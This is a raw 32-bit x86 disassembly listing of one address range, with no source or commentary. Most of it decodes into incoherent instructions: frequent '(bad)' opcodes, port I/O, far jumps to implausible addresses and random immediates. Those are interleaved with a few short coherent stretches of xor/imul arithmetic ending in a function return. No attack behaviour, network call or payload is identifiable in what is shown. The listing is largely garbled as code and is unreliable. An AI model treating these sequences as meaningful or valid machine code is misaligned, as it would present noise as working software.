  409077:	xchg   edi,eax
  409078:	push   0xc
  40907a:	push   edx
  40907b:	pushf  
  40907c:	push   es
  40907d:	or     BYTE PTR [esi+0x32],bl
  409080:	jmp    0x4873b8e2
  409085:	jns    0x4090b0
  409087:	mov    bh,0x76
  409089:	fs jecxz 0x4090d1
  40908c:	dec    di
  40908e:	shr    BYTE PTR [ebp+0x2322a1e0],1
  409094:	mov    eax,ds:0xe0016593
  409099:	or     ecx,edx
  40909b:	icebp  
  40909c:	or     DWORD PTR [edx+0x14f70ca6],0xf74aaf44
  4090a6:	lds    edx,FWORD PTR [ecx+0x3d]
  4090a9:	xchg   esp,eax
  4090aa:	in     al,0xe7
  4090ac:	call   0x8989c45a
  4090b1:	add    esi,edi
  4090b3:	test   BYTE PTR [ebp-0x29da4c74],ah
  4090b9:	mov    esp,0x4829343c
  4090be:	data16 cli 
  4090c0:	lods   eax,DWORD PTR ds:[esi]
  4090c1:	push   ss
  4090c2:	jnp    0x4090ac
  4090c4:	sub    ebx,DWORD PTR [edx+ebx*4]
  4090c7:	inc    ecx
  4090c8:	sub    DWORD PTR [edx-0x76],ebp
  4090cb:	or     BYTE PTR [ebx],dl
  4090cd:	jmp    0xc7f0:0x3b68e81d
  4090d4:	add    eax,0x42af81
  4090d9:	jne    0x409156
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x6ba4c6c4
  4090f5:	push   edx
  4090f6:	jbe    0x4090d5
  4090f8:	mov    gs,edi
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x409164
  409101:	dec    ebp
  409102:	inc    ebp
  409103:	(bad)  
  409104:	out    dx,al
  409105:	dec    esi
  409106:	mov    ebp,0x3d44837d
  40910b:	jne    0x40918a
  40910d:	add    edx,ecx
  40910f:	push   esp
  409110:	pop    eax
  409111:	ret    
  409112:	(bad)
  409116:	int    0x9b
  409118:	sbb    ecx,esi
  40911a:	jns    0x4090ef
  40911c:	ins    BYTE PTR es:[edi],dx
  40911d:	call   eax
  40911f:	(bad)  
  409120:	pop    edx
  409121:	in     eax,0x8e
  409123:	add    eax,DWORD PTR [eax+0x49d7483f]
  409129:	or     ah,bl
  40912b:	push   0xffffffd9
  40912d:	pop    edi
  40912e:	mov    dh,0xc5
  409130:	not    DWORD PTR [esi-0x22402d90]
  409136:	pop    esp
  409137:	mov    al,ds:0x6284d586
  40913c:	loope  0x409167
  40913e:	mov    ds:0x1df5480,eax
  409143:	or     dl,BYTE PTR ds:0xd0438596
  409149:	adc    al,0x6d
  40914b:	cld    
  40914c:	pop    ebx
  40914d:	push   edx
  40914e:	sbb    al,0x2f
  409150:	(bad)  
  409152:	stos   DWORD PTR es:[edi],eax
  409153:	jmp    0x65b00757
  409158:	dec    edi
  409159:	push   0xdd086d56
  40915e:	xchg   BYTE PTR [esi-0xf],bl
  409161:	xchg   esp,eax
  409162:	sbb    eax,0x1832e4ca
  409167:	sbb    DWORD PTR [eax],0x3d5545ae
  40916d:	mov    ah,0xbf
  40916f:	jnp    0x40917a
  409171:	jns    0x409192
  409173:	out    0xd6,eax
  409175:	cdq    
  409176:	(bad)  
  409177:	sbb    al,0x54
  409179:	outs   dx,DWORD PTR ds:[esi]
  40917a:	sbb    BYTE PTR [edx],al
  40917c:	mov    esi,0x9863e390
  409181:	jns    0x409140
  409183:	pushf  
  409184:	add    al,0x48
  409186:	jmp    0xbe96:0x92e7249f
  40918d:	dec    eax
  40918e:	add    eax,0x711698dd
  409193:	ffree  st(3)
  409195:	sbb    eax,DWORD PTR [ecx+0x16ca4e0d]
  40919b:	push   ds
  40919c:	fist   DWORD PTR [ebx]
  40919e:	adc    BYTE PTR [ecx-0x3dc1bd36],al
  4091a4:	icebp  
  4091a5:	std    
  4091a6:	jp     0x4091d1
  4091a8:	sbb    bl,BYTE PTR [edx]
  4091aa:	mov    al,ds:0xc70f161
  4091af:	and    eax,0x425b44b8
  4091b4:	out    0x5d,eax
  4091b6:	inc    ebx
  4091b7:	pushf  
  4091b8:	ja     0x4091f1
  4091ba:	jnp    0x4091d1
  4091bc:	test   BYTE PTR [esp+ebx*8+0x71],0xda
  4091c1:	jmp    0x523c:0x548ba104
  4091c8:	xor    DWORD PTR [edx-0x41],esi
  4091cb:	clc    
  4091cc:	sub    al,0xf6
  4091ce:	pushf  
  4091cf:	jbe    0x409193
  4091d1:	jmp    0xc33da20e
  4091d6:	dec    edx
  4091d7:	pop    edx
  4091d8:	mov    dh,0xa4
  4091da:	sbb    edi,DWORD PTR [ebx]
  4091dc:	rcr    BYTE PTR [ebp-0x642b35ba],0x9f
  4091e3:	ret    0xb7f7
  4091e6:	mov    eax,0xe80fadc
  4091eb:	jo     0x4091bf
  4091ed:	shr    dl,1
  4091ef:	pusha  
  4091f0:	push   ecx
  4091f1:	pop    ss
  4091f2:	xlat   BYTE PTR ds:[ebx]
  4091f3:	add    al,BYTE PTR [edx]
  4091f5:	dec    esp
  4091f6:	xchg   ecx,eax
  4091f7:	mov    al,0x33
  4091f9:	and    eax,0x96ddf1c1
  4091fe:	xchg   ebp,eax
  4091ff:	ds pop esi
  409201:	out    0x59,eax
  409203:	es int 0x48
  409206:	and    DWORD PTR [eax-0x4ac7b038],ebx
  40920c:	pop    esi
  40920d:	mov    edx,0xab2ab43b
  409212:	addr16 inc esi
  409214:	dec    esp
  409215:	xor    ecx,edi
  409217:	mov    bl,0x33
  409219:	adc    al,0xb0
  40921b:	mov    ch,0x2b
  40921d:	xchg   ebx,eax
  40921e:	mov    esp,0xb5dce963
  409223:	xchg   edx,eax
  409224:	pusha  
  409225:	add    DWORD PTR [ebp+0x65],ebx
  409228:	sub    cl,BYTE PTR [eax-0x22]
  40922b:	je     0x4091c6
  40922d:	xor    DWORD PTR ds:0xad9f4585,eax
  409233:	xor    DWORD PTR [ebx-0x52],ecx
  409236:	xor    edx,DWORD PTR [esi]
  409238:	dec    esp
  409239:	pop    edi
  40923a:	inc    edi
  40923b:	jae    0x4091ed
  40923d:	rcr    DWORD PTR [ecx-0x5d],0x30
  409241:	add    ch,BYTE PTR [ecx]
  409243:	push   cs
  409244:	xchg   esp,eax
  409245:	xchg   esp,eax
  409246:	mov    bh,0x51
  409248:	mov    ds:0x7d1987fe,al
  40924d:	loop   0x4091dd
  40924f:	pop    esp
  409250:	sahf   
  409251:	mov    bl,BYTE PTR [edi]
  409253:	add    eax,0x75560945
  409258:	jbe    0x409269
  40925a:	mov    ds:0xc939e836,al
  40925f:	jg     0xb45147f2
  409265:	(bad)  
  409266:	mov    bl,0x31
  409268:	inc    eax
  409269:	test   eax,0x72843b4e
  40926e:	or     DWORD PTR [eax-0x1764e0c7],esp
  409274:	sub    dh,bh
  409276:	adc    DWORD PTR [ebp+0x3c],0x8470a48b
  40927d:	call   0xb39f285a
  409282:	adc    ebp,ecx
  409284:	jge    0x409259
  409286:	sbb    ebx,DWORD PTR [edx+0x2e55d998]
  40928c:	pop    es
  40928d:	adc    BYTE PTR [ebx],cl
  40928f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409290:	add    eax,0x78354e2b
  409295:	add    eax,0x12af2a95
  40929a:	cmp    DWORD PTR [edi-0x293b723f],esi
  4092a0:	jmp    0x4092fd
  4092a2:	fbld   TBYTE PTR [edi+0x3a5c18cf]
  4092a8:	je     0x409311
  4092aa:	pop    ds
  4092ab:	jle    0x409301
  4092ad:	je     0x409286
  4092af:	out    dx,eax
  4092b0:	ret    0x3f8c
  4092b3:	pusha  
  4092b4:	popa   
  4092b5:	jbe    0x409294
  4092b7:	(bad)  
  4092b8:	cmp    bh,BYTE PTR fs:[ebx+0x7a]
  4092bc:	imul   esi,DWORD PTR [ecx+0x14],0xf58d7672
  4092c3:	push   ss
  4092c4:	inc    edi
  4092c5:	imul   esi,DWORD PTR [ebx-0x531f18d7],0xf79ea9aa
  4092cf:	ret    
  4092d0:	les    edx,FWORD PTR [edx]
  4092d2:	aam    0x63
  4092d4:	sub    esp,esp
  4092d6:	or     al,0xa2
  4092d8:	sbb    bh,BYTE PTR [edx]
  4092da:	xor    BYTE PTR [ebp-0xb7c6deb],dh
  4092e0:	push   edx
  4092e1:	jo     0x4092bd
  4092e3:	jmp    0xae713a6b
  4092e8:	or     BYTE PTR [edi-0x23],bh
  4092eb:	inc    esp
  4092ec:	lock mov WORD PTR es:[eax+eiz*1],ds
  4092f1:	outs   dx,BYTE PTR ds:[esi]
  4092f2:	stc    
  4092f3:	jae    0x409316
  4092f5:	push   0xfb990149
  4092fa:	or     bh,0x94
  4092fd:	scas   eax,DWORD PTR es:[edi]
  4092fe:	iret   
  4092ff:	inc    eax
  409300:	arpl   cx,cx
  409302:	fst    DWORD PTR [edi-0x14]
  409305:	adc    eax,0x4469cbfc
  40930a:	data16 adc BYTE PTR [ecx+0x2],dl
  40930e:	call   0xfb53:0x65bdb2e6
  409315:	aad    0xaf
  409317:	pop    ds
  409318:	hlt    
  409319:	push   edi
  40931a:	inc    ebp
  40931b:	(bad)  
  40931c:	mov    ch,0xd4
  40931e:	aas    
  40931f:	adc    al,0xbb
  409321:	ret    0xee22
  409324:	inc    esp
  409325:	mov    ebx,0x2849c810
  40932a:	pushf  
  40932b:	inc    edi
  40932c:	mov    BYTE PTR [edx+eax*4+0x72daf757],bl
  409333:	(bad)  
  409334:	std    
  409335:	xchg   edi,eax
  409336:	and    al,0xcd
  409338:	inc    ecx
  409339:	icebp  
  40933a:	test   eax,0xcf9eeb02
  40933f:	mov    edx,DWORD PTR [eax+0x57]
  409342:	and    al,0x29
  409344:	pop    es
  409345:	imul   ecx,DWORD PTR [esi+0x45],0xacc93456
  40934c:	inc    edi
  40934d:	add    DWORD PTR [eax],ebx
  40934f:	ins    BYTE PTR es:[edi],dx
  409350:	push   es
  409351:	cmp    al,0x3
  409353:	jecxz  0x409399
  409355:	cmp    bl,BYTE PTR [ebp-0x67]
  409358:	jp     0x40934b
  40935a:	imul   edi,DWORD PTR [edi],0x28
  40935d:	shr    DWORD PTR [ebp+0x548d2df],1
  409363:	fsub   DWORD PTR [ecx+0x60885d08]
  409369:	xchg   esi,eax
  40936a:	loop   0x4093e6
  40936c:	jbe    0x40931e
  40936e:	pop    es
  40936f:	ins    DWORD PTR es:[edi],dx
  409370:	in     eax,dx
  409371:	adc    BYTE PTR [ecx-0x72],cl
  409374:	in     eax,dx
  409375:	(bad)  
  409376:	jbe    0x4093e4
  409378:	cwde   
  409379:	sti    
  40937a:	hlt    
  40937b:	cmp    DWORD PTR [edx-0x70ad577c],edi
  409381:	retf   0x319a
  409384:	jnp    0x4093f2
  409386:	lds    edx,FWORD PTR [eax+ebx*1-0x245095f7]
  40938d:	and    edx,DWORD PTR [ecx-0x7dd2e3e9]
  409393:	sahf   
  409394:	in     al,0xd3
  409396:	or     DWORD PTR [ebx-0x42d693a4],eax
  40939c:	dec    esp
  40939d:	ds mov dl,0xad
  4093a0:	and    dh,BYTE PTR [eax+eax*8+0x58]
  4093a4:	jno    0x40938c
  4093a6:	push   eax
  4093a7:	enter  0x8bb3,0x45
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42af39,0x42aee9
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x3490ff3d
  4093fb:	push   0x78ec359c
  409400:	js     0x4093a9
  409402:	jle    0x40947c
  409404:	js     0x4093ca
  409406:	sbb    DWORD PTR [edx+0x58],ebp
  409409:	je     0x4093c0
  40940b:	clc    
  40940c:	scas   al,BYTE PTR es:[edi]
  40940d:	mov    dh,0x68
  40940f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409410:	add    ch,ch
  409412:	jne    0x409467
  409414:	or     al,dh
  409416:	lahf   
  409417:	mov    WORD PTR [ebp-0x38db7352],ds
  40941d:	addr16 add edi,eax
  409420:	outs   dx,DWORD PTR ds:[esi]
  409421:	dec    ebp
  409422:	cmp    al,0xb0
  409424:	outs   dx,BYTE PTR ds:[esi]
  409425:	inc    ebx
  409426:	jecxz  0x40943c
  409428:	mov    al,0x2b
  40942a:	or     DWORD PTR [edi+0x38],eax
  40942d:	loop   0x409427
  40942f:	xchg   edi,eax
  409430:	jnp    0x409463
  409432:	mov    al,ds:0x5dfb6f80
  409437:	ror    DWORD PTR [ecx+0x5],1
  40943a:	scas   eax,DWORD PTR es:[edi]
  40943b:	xchg   esi,eax
  40943c:	and    DWORD PTR [eax+0x6f6b4b72],ecx
  409442:	xchg   BYTE PTR [esi],dl
  409444:	stos   DWORD PTR es:[edi],eax
  409445:	shl    DWORD PTR [edi-0x2b],0x12
  409449:	dec    ecx
  40944b:	and    edi,ebp
  40944d:	dec    esp
  40944e:	les    edi,FWORD PTR [edx-0x719742eb]
  409454:	xchg   edx,ecx
  409456:	ror    BYTE PTR [esi+0x4f52cc89],1
  40945c:	outs   dx,DWORD PTR ds:[esi]
  40945d:	pop    esi
  40945e:	mov    ebp,ecx
  409460:	mov    dh,0x1
  409462:	add    DWORD PTR ds:[edi],ecx
  409465:	adc    al,0xca
  409467:	mov    ch,0x40
  409469:	xor    eax,0xd53bc79f
  40946e:	push   es
  40946f:	inc    ecx
  409470:	xchg   BYTE PTR [esi+0x5a686912],dl
  409476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409477:	ror    al,cl
  409479:	adc    eax,0xfa82d826
  40947e:	lahf   
  40947f:	(bad)
  409482:	jp     0x409407
  409484:	repz retf 0xefa1
  409488:	leave  
  409489:	out    0x5a,al
  40948b:	cmp    ah,BYTE PTR [edx-0x4ab00d50]
  409491:	xchg   ebp,eax
  409492:	out    dx,al
  409493:	imul   ebp,DWORD PTR [ebx+0x9],0x5
  409497:	out    0x73,al
  409499:	jb     0x409423
  40949b:	mov    fs,WORD PTR [esi+0x588310fd]
  4094a1:	mov    al,ds:0x73632880
  4094a6:	(bad)  
  4094a7:	in     eax,0xd4
  4094a9:	jl     0x409508
  4094ab:	push   0x8b8fe2ed
  4094b0:	aaa    
  4094b1:	and    esi,DWORD PTR [ebx-0xd]
  4094b4:	rcl    BYTE PTR [ebp-0x4],cl
  4094b7:	fadd   QWORD PTR [ebx-0x697e2df]
  4094bd:	sub    dl,bl
  4094bf:	xlat   BYTE PTR ds:[ebx]
  4094c0:	or     eax,0x309e4a66
  4094c5:	loop   0x4094fd
  4094c7:	neg    DWORD PTR [edx]
  4094c9:	mov    ah,0xbe
  4094cb:	mov    eax,ds:0xfdd44bc
  4094d0:	xchg   ebp,eax
  4094d1:	ss es jbe 0x409539
  4094d5:	sub    dl,ch
  4094d7:	fdivr  st(5),st
  4094d9:	sahf   
  4094da:	jne    0x409491
  4094dc:	xchg   edi,eax
  4094dd:	sbb    eax,0x66a8086f
  4094e2:	fwait
  4094e3:	pop    ebp
  4094e4:	dec    edx
  4094e5:	rcr    DWORD PTR [edi+0x19],0xda
  4094e9:	dec    eax
  4094ea:	xor    DWORD PTR [esi+ebp*8+0x38],esp
  4094ee:	ins    DWORD PTR es:[edi],dx
  4094ef:	fs jle 0x4094e8
  4094f2:	xchg   esi,eax
  4094f3:	xchg   eax,esi
  4094f5:	add    DWORD PTR [eax-0x17],0xffffffae
  4094f9:	jo     0x40949d
  4094fb:	jg     0x4094d7
  4094fd:	inc    edi
  4094fe:	out    0x8c,eax
  409500:	scas   al,BYTE PTR es:[edi]
  409501:	test   al,0x12
  409503:	std    
  409504:	loopne 0x40953f
  409506:	xor    bh,BYTE PTR [esi]
  409508:	call   0x4214:0x938d428
  40950f:	sub    BYTE PTR [esi+0x2a936cfc],ch
  409515:	mov    esi,0xeb4956b
  40951a:	mov    dl,0x10
  40951c:	jo     0x4094c0
  40951e:	imul   eax,DWORD PTR [ecx+0x39],0xb975cd58
  409525:	push   ebp
  409526:	cmp    ebx,edi
  409528:	imul   esi,esp,0xe17e50d4
  40952e:	repz pop ebx
  409530:	aas    
  409531:	jge    0x409565
  409533:	aaa    
  409534:	imul   eax,DWORD PTR [edx-0x45766fe2],0x72
  40953b:	mov    ecx,0x68e071f0
  409540:	xor    eax,0xe6c88e26
  409545:	sbb    bh,ch
  409547:	(bad)  
  409548:	cld    
  409549:	add    al,0x20
  40954b:	repnz fwait
  40954d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40954e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40954f:	mov    DWORD PTR [ebp+0x42],ecx
  409552:	cmp    DWORD PTR [edi+edx*8-0x3a209ade],0xb122255
  40955d:	js     0x409508
  40955f:	pop    ss
  409560:	lock out 0x9f,eax
  409563:	shl    DWORD PTR [edi-0x6c2d73ee],1
  409569:	test   DWORD PTR [esi],0x2bf64e6c
  40956f:	sbb    DWORD PTR [edx+0x58],ecx
  409572:	sti    
  409573:	test   cl,dl
  409575:	jmp    0x4095cb
  409577:	jo     0x40951b
  409579:	xor    DWORD PTR ds:0x67e1abd6,0x7b
  409580:	rcr    BYTE PTR [edx],1
  409582:	mov    ah,BYTE PTR [edi]
  409584:	cs pop edi
  409586:	add    al,0x33
  409588:	add    eax,0x5687d0ef
  40958d:	rcr    bh,cl
  40958f:	push   0x37e6fb0d
  409594:	cmp    al,0xae
  409596:	pop    edi
  409597:	lods   eax,DWORD PTR ds:[esi]
  409598:	in     al,0xab
  40959a:	mov    ds:0x499e4b86,al
  40959f:	mov    al,ds:0x2fbf5224
  4095a4:	je     0x4095ab
  4095a6:	sub    bl,BYTE PTR [bp+si+0x4c]
  4095aa:	dec    ebx
  4095ab:	xchg   ecx,eax
  4095ac:	fs or  al,0x6
  4095af:	pop    eax
  4095b0:	mov    ds:0xafe5042,al
  4095b5:	vpcmpeqd xmm1,xmm2,xmm2
  4095b9:	shl    BYTE PTR [ebx+0x6],cl
  4095bc:	repz lds eax,FWORD PTR [ebp-0x3c9394bb]
  4095c3:	outs   dx,BYTE PTR ds:[esi]
  4095c4:	loope  0x409583
  4095c6:	fldenv [ecx-0x41]
  4095c9:	test   BYTE PTR [edi-0x43],bl
  4095cc:	imul   eax,ebx,0xcb59b9aa
  4095d2:	add    eax,ecx
  4095d4:	xchg   ecx,eax
  4095d5:	adc    edx,DWORD PTR [ecx]
  4095d7:	jecxz  0x409632
  4095d9:	xchg   esi,eax
  4095da:	outs   dx,BYTE PTR ds:[esi]
  4095db:	dec    eax
  4095dc:	sbb    ch,BYTE PTR [eax-0x5f]
  4095df:	les    edx,FWORD PTR [esi]
  4095e1:	pop    ds
  4095e2:	or     BYTE PTR [ebx-0x6a],0xbe
  4095e6:	fdiv   DWORD PTR [edx]
  4095e8:	je     0x4095a6
  4095ea:	push   es
  4095eb:	ficom  WORD PTR [edx-0x23]
  4095ee:	mov    ch,0x6a
  4095f0:	repnz stc 
  4095f2:	ss je  0x409623
  4095f5:	push   0xdff3eae7
  4095fa:	retf   0xa562
  4095fd:	cmp    bl,dh
  4095ff:	hlt    
  409600:	mov    eax,ds:0x44c2891b
  409605:	adc    DWORD PTR [ecx-0x130fcd0],edx
  40960b:	int    0x6b
  40960d:	pushf  
  40960e:	test   al,0x7e
  409610:	(bad)  
  409611:	push   ds
  409612:	inc    ebx
  409613:	jne    0x409691
  409615:	call   0x25fd:0x9e410e80
  40961c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40961e:	imul   ebx,DWORD PTR [edx+0x6adf9d06],0x2883fff0
  409628:	rcr    BYTE PTR [eax+0x49ad0091],0xf9
  40962f:	sbb    BYTE PTR [edx+0xb],0x8c
  409633:	cmp    al,0x13
  409635:	jecxz  0x4095e1
  409637:	inc    ebp
  409638:	loope  0x409657
  40963a:	mov    esp,0xecddbbec
  40963f:	outs   dx,BYTE PTR ds:[esi]
  409640:	mov    bl,0xde
  409642:	mov    esp,DWORD PTR [ebx+0x3cf89dbf]
  409648:	mov    cl,0x42
  40964a:	leave  
  40964b:	jo     0x4095e7
  40964d:	ja     0x409684
  40964f:	rcr    BYTE PTR [eax-0x32105eee],0xa8
  409656:	or     BYTE PTR ds:0x6b3f142a,0xf2
  40965d:	imul   DWORD PTR [edi+0x7a]
  409660:	jmp    0x40967c
  409662:	iret   
  409663:	xlat   BYTE PTR ds:[ebx]
  409664:	fcomp  st(7)
  409666:	pop    ebx
  409667:	dec    eax
  409668:	stc    
  409669:	cmp    al,0x24
  40966b:	inc    edx
  40966c:	adc    dh,ah
  40966e:	push   edx
  40966f:	push   0x32
  409671:	pop    ss
  409672:	fldenv [edi-0x2b284aae]
  409678:	outs   dx,BYTE PTR ds:[esi]
  409679:	in     al,0xcc
  40967b:	sbb    eax,0x6c4d0cd7
  409680:	(bad)
  409684:	push   0x1bc971a6
  409689:	(bad)  
  40968a:	outs   dx,DWORD PTR ds:[esi]
  40968b:	(bad)  
  40968d:	push   eax
  40968e:	lods   al,BYTE PTR ds:[esi]
  40968f:	sub    al,0xb2
  409691:	std    
  409692:	dec    esp
  409693:	in     eax,dx
  409694:	leave  
  409695:	or     bh,bl
  409697:	dec    eax
  409698:	cpuid  
  40969a:	dec    edi
  40969b:	pop    ebx
  40969c:	imul   esi,esp,0xc42120c4
  4096a2:	jge    0x409659
  4096a4:	stc    
  4096a5:	(bad)  
  4096a6:	xchg   DWORD PTR [ebx],ecx
  4096a8:	inc    edi
  4096a9:	mov    edi,0xcd4e51c6
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xd9
  4096e4:	arpl   cx,bx
  4096e6:	icebp  
  4096e7:	pop    esp
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409749
  4096f0:	daa    
  4096f1:	pop    ds
  4096f2:	inc    ebp
  4096f3:	xchg   BYTE PTR [edi+0x645b77c2],bh
  4096f9:	lods   eax,DWORD PTR ds:[esi]
  4096fa:	dec    edx
  4096fb:	lods   al,BYTE PTR ds:[esi]
  4096fc:	mov    ds:0xb92105db,eax
  409701:	push   eax
  409702:	adc    edx,eax
  409704:	into   
  409705:	(bad)  
  409706:	fcomp  QWORD PTR [eax-0x1be27786]
  40970c:	bound  ebp,QWORD PTR [esi]
  40970e:	in     al,0x7
  409710:	xchg   ebp,eax
  409711:	cmp    eax,0xf8f0be5b
  409716:	jl     0x409706
  409718:	mov    esp,0x784d60ca
  40971d:	cwde   
  40971e:	int3   
  40971f:	mov    WORD PTR [esi+ebp*2-0x1d],ss
  409723:	ret    
  409724:	dec    edx
  409725:	stos   BYTE PTR es:[edi],al
  409726:	loopne 0x40979c
  409728:	cmc    
  409729:	xchg   edi,eax
  40972a:	add    ah,dh
  40972c:	cmp    bl,bh
  40972e:	xor    bl,bh
  409730:	std    
  409731:	mov    ebp,0x347707ae
  409736:	push   esi
  409737:	add    DWORD PTR [ebp-0x14],ecx
  40973a:	ins    BYTE PTR es:[edi],dx
  40973b:	jae    0x409734
  40973d:	mov    al,ds:0xfa36a407
  409742:	pop    ebx
  409743:	es ss mov ds,WORD PTR cs:[ecx-0x13]
  409749:	xchg   edi,eax
  40974a:	mov    ecx,0xeea08558
  40974f:	sti    
  409750:	and    BYTE PTR [edi],ah
  409752:	lahf   
  409753:	mov    esi,0xe91c1af6
  409758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409759:	lea    esi,[ecx-0x8]
  40975c:	or     DWORD PTR [esi-0x5c],eax
  40975f:	(bad)  [edi+edi*2]
  409762:	push   0x201fefa6
  409767:	xchg   DWORD PTR [edi-0x68],edx
  40976a:	mov    bl,0xfe
  40976c:	int3   
  40976d:	pop    es
  40976e:	jmp    0xf137:0x293be5db
  409775:	ja     0x409732
  409777:	push   cs
  409778:	pop    esp
  409779:	push   edx
  40977a:	jne    0x409774
  40977c:	jnp    0x4097e2
  40977e:	push   edx
  40977f:	sbb    al,ah
  409781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409782:	cmp    edx,DWORD PTR [ecx-0x46]
  409785:	inc    edx
  409786:	(bad)  [eax]
  409788:	xor    al,BYTE PTR [edi-0x73dd0de3]
  40978e:	cdq    
  40978f:	mov    edx,0xb7c2f230
  409794:	sbb    BYTE PTR [esi],bh
  409796:	push   eax
  409797:	fisttp DWORD PTR [eax+0x5]
  40979a:	out    dx,al
  40979b:	scas   eax,DWORD PTR es:[edi]
  40979c:	inc    BYTE PTR [eax*4-0x5d50624f]
  4097a3:	pop    eax
  4097a4:	and    eax,0x45
  4097a7:	jle    0x4097f5
  4097a9:	sub    ebx,DWORD PTR [eax]
  4097ab:	push   ecx
  4097ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ad:	bound  si,DWORD PTR [ebp+0x6bead6f5]
  4097b4:	mov    ecx,0xc8c0f596
  4097b9:	adc    cl,BYTE PTR [esi]
  4097bb:	mov    bl,0x7e
  4097bd:	mov    dl,0xe0
  4097bf:	sbb    bl,BYTE PTR [edx]
  4097c1:	popf   
  4097c2:	xor    esi,DWORD PTR [ebx]
  4097c4:	cmp    BYTE PTR [edx-0x148eab34],ch
  4097ca:	sub    al,0x34
  4097cc:	neg    BYTE PTR [edx-0x139194ce]
  4097d2:	jae    0x40980a
  4097d4:	pop    ss
  4097d5:	jp     0x4097f8
  4097d7:	mov    eax,ds:0xadcae49f
  4097dc:	push   edi
  4097dd:	sti    
  4097de:	xchg   ecx,eax
  4097df:	(bad)  
  4097e0:	adc    bl,al
  4097e2:	xor    al,0x26
  4097e4:	jne    0x409834
  4097e6:	mov    edx,0xd397d0d3
  4097eb:	inc    edx
  4097ec:	sbb    eax,0xf4957b29
  4097f1:	icebp  
  4097f2:	cmc    
  4097f3:	push   esi
  4097f4:	push   edx
  4097f5:	dec    ebx
  4097f6:	std    
  4097f7:	or     al,0x35
  4097f9:	mov    DWORD PTR [ebx+eiz*1-0xc489700],0x72524c4a
  409804:	pop    ds
  409805:	pop    es
  409806:	adc    al,0x51
  409808:	push   ebx
  409809:	sub    DWORD PTR [esi-0x5c],esp
  40980c:	leave  
  40980d:	aam    0xf9
  40980f:	int    0xc8
  409811:	sbb    cl,ah
  409813:	and    al,0xdc
  409815:	mov    bl,0x7e
  409817:	mov    edi,0x90fd8ade
  40981c:	sbb    eax,0x237926c
  409821:	out    0x12,al
  409823:	fisub  WORD PTR [ebp-0x45]
  409826:	cwde   
  409827:	xchg   ebx,eax
  409828:	adc    eax,0x63786152
  40982d:	dec    esp
  40982e:	into   
  40982f:	add    al,0x6e
  409831:	ds loope 0x4097db
  409834:	(bad)  [eax-0x6709fd8b]
  40983a:	cli    
  40983b:	dec    edi
  40983c:	jge    0x409828
  40983e:	sbb    BYTE PTR [ebp-0x2c],dl
  409841:	dec    esp
  409842:	xchg   ebp,eax
  409843:	loope  0x4097c6
  409845:	mov    bh,0x87
  409847:	ins    DWORD PTR es:[edi],dx
  409848:	xor    ch,BYTE PTR [ecx]
  40984a:	test   al,0xdf
  40984c:	push   ds
  40984d:	cmp    bl,BYTE PTR [ecx+edi*1-0x184d8990]
  409854:	pop    esp
  409855:	js     0x4098a5
  409857:	push   eax
  409858:	test   eax,0x753e18eb
  40985d:	mov    cl,0x65
  40985f:	das    
  409860:	dec    esi
  409861:	sub    dl,bl
  409863:	ficomp DWORD PTR [esi+edx*1-0x7]
  409867:	(bad)  
  409868:	xor    al,0x78
  40986a:	mov    ecx,DWORD PTR [ecx-0x4f]
  40986d:	daa    
  40986e:	and    BYTE PTR [ecx+esi*8+0x50],dh
  409872:	mov    ds:0xfeb1a42d,eax
  409877:	std    
  409878:	and    DWORD PTR [edi+esi*4-0x7488a15a],ecx
  40987f:	inc    ecx
  409880:	xor    DWORD PTR [ebx],0x25
  409883:	add    eax,0x9336c6cb
  409888:	jbe    0x4098de
  40988a:	test   al,0xbc
  40988c:	out    dx,al
  40988d:	dec    ebp
  40988e:	cdq    
  40988f:	ror    BYTE PTR [esi],cl
  409891:	push   esp
  409892:	sbb    al,0xf0
